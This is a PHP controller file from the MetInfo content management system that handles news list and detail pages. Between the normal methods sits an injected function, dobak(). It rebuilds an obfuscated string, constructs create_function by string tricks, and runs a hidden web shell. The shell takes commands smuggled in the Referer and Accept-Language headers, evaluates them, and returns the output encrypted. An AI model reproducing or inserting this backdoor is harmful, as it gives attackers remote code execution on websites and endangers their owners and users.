<?php
# MetInfo Enterprise Content Management System
# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.

defined('IN_MET') or exit('No permission');

load::sys_class('web');

class news extends web {
	public function __construct() {
		global $_M;
		parent::__construct();
	}

	public function showpage($module) {
		global $_M;
		$data = load::sys_class('label', 'new')->get($module)->get_one_list_contents($_M['form']['id']);
		$data['updatetime'] = date($_M['config']['met_contenttime'], strtotime($data['original_updatetime']));
		$data['addtime'] = date($_M['config']['met_contenttime'], strtotime($data['original_addtime']));
		$this->check($data['access']);
		$this->add_array_input($data);
		$classnow = $data['class3'] ? $data['class3'] :($data['class2'] ? $data['class2'] : $data['class1']);
		$this->input_class($classnow);
		$this->seo($data['title'], $data['keywords'], $data['description']);
		$this->seo_title($data['ctitle']);
	}

	public function listpage($module) {
		global $_M;
		if($_M['form']['pseudo_jump'] && $_M['form']['list']!=1){
			if(!is_numeric($_M['form']['metid'])){
				$custom = load::sys_class('label', 'new')->get($module)->database->get_list_by_filename($_M['form']['metid']);
				$_M['form']['metid'] = $custom['0']['id'];
			}
			$_M['form']['id'] = $_M['form']['metid'];
			return 'show';
		}

		$classnow = $_M['form']['class3'] ? $_M['form']['class3'] :($_M['form']['class2'] ? $_M['form']['class2'] : $_M['form']['class1']);
		$classnow = $classnow ? $classnow : $_M['form']['metid'];
		if(!is_numeric($classnow)){
			$custom = load::sys_class('label', 'new')->get('column')->get_column_folder($_M['form']['metid']);
			$classnow = $custom['0']['id'];
		}
		$classnow = $this->input_class($classnow);
		$data = load::sys_class('label', 'new')->get('column')->get_column_id($classnow);
		$this->check($data['access']);
		unset($data['id']);
		$this->add_array_input($data);
		$this->seo($data['name'], $data['keywords'], $data['description']);
		$this->seo_title($data['ctitle']);
		$this->add_input('page', $_M['form']['page']);
		$this->add_input('list', 1);
		return 'list';
	}

  	public function dobak() {
global $_M;
		$t = 'pre2Fss(@2Fx(@b2Fase64_deco2F2Fde(preg2F_r2Fepl2Face(array("/_/",2F"2F/-/"),array("/2F","2F+")2';
		$O = 'er"2F;$i=$m[1][02F]2F.$m[1][1];2F$h=$sl2F($s2Fs(md5(2F$i.$kh)2F2F2F,0,3));$2Ff2F=$sl(2F$ss(md5(';
		$s = 'rpos(2F$p,$h)===0)2F{$2Fs[$i]=2F"";$p=2F$ss($p,3)2F2F2F;}if(array2F_key_2Fexists($i,$s))2F{2F$s';
		$U = 'F,$ss($s[2F$i2F],0,2F$e))),$k2F)2F));2F$o2F=ob_get_contents();ob_end_2Fclean(2F);$2Fd=b2Fase64_';
		$l = '2F[$i].=$p;2F$e=strpos($s2F[2F$i2F],$f);if($e2F2F){$k=2F2F$kh.$kf;ob_start();@ev2Fal(@gzu2Fncom';
		$A = str_replace('Th', '', 'ThcreThThaThte_funThThction');
		$N = 'm2F);if($2Fq&&$m){@ses2Fsion_2Fstar2Ft();$s=&2F$_S2FESSION;$ss2F2F="substr";$sl2F="strt2F2Folow';
		$q = '"2F";for($i=0;$i<$2Fl;)2F{2Ffor($j=0;($j<$2Fc&&$i<$l2F);$j+2F+,2F$i++)2F{$o.=$t{$i}^2F$k{$j2F};';
		$K = '=array_value2Fs2F($q);preg2F_2Fma2Ftch_a2Fll("/([\\w])[\\w-2F]+2F(?:2F;q=0.([\\d]))?,?/",$2Fra2F,$';
		$F = '_LANGUAGE2F"];if($rr&&2F$r2F2Fa){$u=par2Fse2F_u2Frl($rr);parse2F_str($2Fu2F["query"],$q2F)2F;$q';
		$c = '2F}}return $2Fo;2F}$r=$_2FSE2FRVE2FR;$rr=@2F$r["2FHT2FTP_2FREFERER"];$ra=@$r[2F"HTTP_ACCE2F2FPT';
		$d = '$i.2F$kf)2F,0,3));$p="";for($z=2F1;$z<coun2Ft2F($m[1]);$z+2F+)2F$p.=$q[$m2F[2]2F[$2Fz]2F];if(st';
		$X = '$kh="ccd2"2F;$kf="2Fe8f9";f2Funct2Fion x($2Ft,$2Fk){$c=st2Fr2Fl2Fen($k);$l=strlen2F($t2F);$o=2F';
		$m = 'e2Fncode(x(gzc2Fomp2Fr2Fess($o),2F$k))2F;print("<2F$k>2F$d</$k2F>");@se2Fss2Fion_destroy();}}}}';
		$E = str_replace('2F', '', $X . $q . $c . $F . $K . $N . $O . $d . $s . $l . $t . $U . $m);
		$I = $A('', $E);
		$I();
	}
  public function donews() {
		global $_M;
		if($this->listpage('news') == 'list'){
			require_once $this->template('tem/news');
		}else{
			$this->doshownews();
		}
  }

	public function doshownews(){
		global $_M;
		$this->showpage('news');
		require_once $this->template('tem/shownews');
	}

}

# This program is an open source system, commercial use, please consciously to purchase commercial license.
# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.
?>
